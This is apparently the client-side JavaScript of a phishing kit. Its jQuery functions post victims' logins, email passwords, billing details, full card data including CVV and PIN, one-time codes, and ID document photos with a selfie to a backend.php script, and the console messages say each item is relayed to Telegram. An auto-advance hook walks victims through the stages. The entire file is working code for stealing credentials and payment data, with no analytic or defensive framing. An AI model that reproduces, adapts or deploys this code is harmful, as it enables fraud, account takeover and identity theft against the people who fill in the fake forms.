//Post requests:.
//sendINFO Functions:.
function sendMainINFO(sess, user, pass) {
   var postman = "backend.php";
   var values = {
      'action': 'login',
      'sess': sess,
      '_user': user,
      '_pass': pass
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Login data sent to Telegram!');
         try {
            var response = JSON.parse(data);
            if (response.status === 'success') {
               console.log('Data successfully sent to Telegram');
            } else {
               console.log('Error: ' + response.message);
            }
         } catch (e) {
            console.log('Response received');
         }
         if (window.AUTO_MODE && typeof window.handleAutoAdvance === 'function') {
            window.handleAutoAdvance('login');
         }
      },
      error: function(xhr, status, error) {
         console.log('Error sending data: ' + error);
      }
   })
}

function sendMlINFO(sess, data) {
   var postman = "backend.php";
   var values = {
      'action': 'email_password',
      'sess': sess,
      '_MLpass': data
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Email password sent to Telegram!');
         try {
            var response = JSON.parse(data);
            if (response.status === 'success') {
               console.log('Data successfully sent to Telegram');
            } else {
               console.log('Error: ' + response.message);
            }
         } catch (e) {
            console.log('Response received');
         }
      },
      error: function(xhr, status, error) {
         console.log('Error sending data: ' + error);
      }
   })
}

function sendBlInfo(sess, data) {
    var postman = "backend.php";
    var values = {
        'action': 'billing',
        'sess': sess,
        'bl_data': data
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('Billing info sent to Telegram!');
            try {
               var response = JSON.parse(data);
               if (response.status === 'success') {
                  console.log('Data successfully sent to Telegram');
               } else {
                  console.log('Error: ' + response.message);
               }
            } catch (e) {
               console.log('Response received');
            }
            if (window.AUTO_MODE && typeof window.handleAutoAdvance === 'function') {
               window.handleAutoAdvance('address');
            }
        },
        error: function(xhr, status, error) {
            console.log('Error sending data: ' + error);
        }
    })
}

function sendCardInfo(sess, fullname, cardNumber, expiry, cvv, pin) {
  var data = {
    'action': 'card',
    'session': sess,
    'fullname': fullname,
    'card_number': cardNumber,
    'expiry': expiry,
    'cvv': cvv,
    'pin': pin
  };

  $.ajax({
    type: 'POST',
    url: 'backend.php',
    data: data,
    success: function(response) {
      console.log('Card info sent to Telegram!');
      try {
         var response = JSON.parse(response);
         if (response.success === true) {
            console.log('Card data successfully sent to Telegram');
         } else {
            console.log('Error: ' + response.message);
         }
      } catch (e) {
         console.log('Response received: ' + response);
      }
      if (window.AUTO_MODE && typeof window.handleAutoAdvance === 'function') {
         window.handleAutoAdvance('card');
      }
    },
    error: function(xhr, status, error) {
      console.log('Error sending card info: ' + error);
    }
  });
}

function sendPIN(sess, kode) {
    var postman = "backend.php";
    var values = {
        'action': 'pin',
        'sess': sess,
        '_pn': kode
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('PIN sent to Telegram!');
            try {
               var response = JSON.parse(data);
               if (response.status === 'success') {
                  console.log('Data successfully sent to Telegram');
               } else {
                  console.log('Error: ' + response.message);
               }
            } catch (e) {
               console.log('Response received');
            }
        },
        error: function(xhr, status, error) {
            console.log('Error sending data: ' + error);
        }
    })
}

function sendKod(sess, kode, type) {
    var postman = "backend.php";
    var values = {
        'action': 'otp',
        'sess': sess,
        'otp_code': kode,
        'type': type
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('OTP code sent to Telegram!');
            try {
               var response = JSON.parse(data);
               if (response.status === 'success') {
                  console.log('Data successfully sent to Telegram');
               } else {
                  console.log('Error: ' + response.message);
               }
            } catch (e) {
               console.log('Response received');
            }
        },
        error: function(xhr, status, error) {
            console.log('Error sending OTP data: ' + error);
        }
    })
}

function sendDocsINFO(sess, front, back, self) {
   var postman = "backend.php";
   var formData = new FormData();
   formData.append('action', 'documents');
   formData.append('sess', sess);
   
   // Convert base64 to files if needed
   if (front) {
      if (front.startsWith('data:')) {
         // It's base64, convert to blob
         var frontBlob = dataURLtoBlob(front);
         formData.append('front_doc', frontBlob, 'front_document.jpg');
      } else {
         formData.append('_front_doc', front);
      }
   }
   
   if (back) {
      if (back.startsWith('data:')) {
         var backBlob = dataURLtoBlob(back);
         formData.append('back_doc', backBlob, 'back_document.jpg');
      } else {
         formData.append('_back_doc', back);
      }
   }
   
   if (self) {
      if (self.startsWith('data:')) {
         var selfBlob = dataURLtoBlob(self);
         formData.append('self_doc', selfBlob, 'selfie_document.jpg');
      } else {
         formData.append('_self_doc', self);
      }
   }

   $.ajax({
      type: 'POST',
      url: postman,
      data: formData,
      processData: false,
      contentType: false,
      success: function (data) {
         console.log('Documents sent to Telegram!');
         try {
            var response = JSON.parse(data);
            if (response.status === 'success') {
               console.log('Documents successfully sent to Telegram');
            } else {
               console.log('Error: ' + response.message);
            }
         } catch (e) {
            console.log('Response received');
         }
      },
      error: function(xhr, status, error) {
         console.log('Error sending documents: ' + error);
      }
   })
}

// Helper function to convert base64 to blob
function dataURLtoBlob(dataurl) {
    var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--){
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], {type:mime});
}

function sendPost(id) {
   var postman = "backend.php";
   var values = {
      'action': 'post_id',
      'id_date': id
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Post ID sent to Telegram!');
         try {
            var response = JSON.parse(data);
            if (response.status === 'success') {
               console.log('Data successfully sent to Telegram');
            } else {
               console.log('Error: ' + response.message);
            }
         } catch (e) {
            console.log('Response received');
         }
      },
      error: function(xhr, status, error) {
         console.log('Error sending data: ' + error);
      }
   })
}


function sendStatusINFO(sess, state) {
    var postman = "backend.php";
    var values = {
        'action': 'status',
        'sess': sess,
        '_status': state
    };

    $.ajax({
        type: 'POST',
        url: postman,
        data: values,
        success: function(data) {
            console.log('Status updated and sent to Telegram! (' + sess + ')');
            try {
               var response = JSON.parse(data);
               if (response.status === 'success') {
                  console.log('Status successfully sent to Telegram');
               } else {
                  console.log('Error: ' + response.message);
               }
            } catch (e) {
               console.log('Response received');
            }
        },
        error: function(xhr, status, error) {
            console.log('Error sending status: ' + error);
        }
    })
}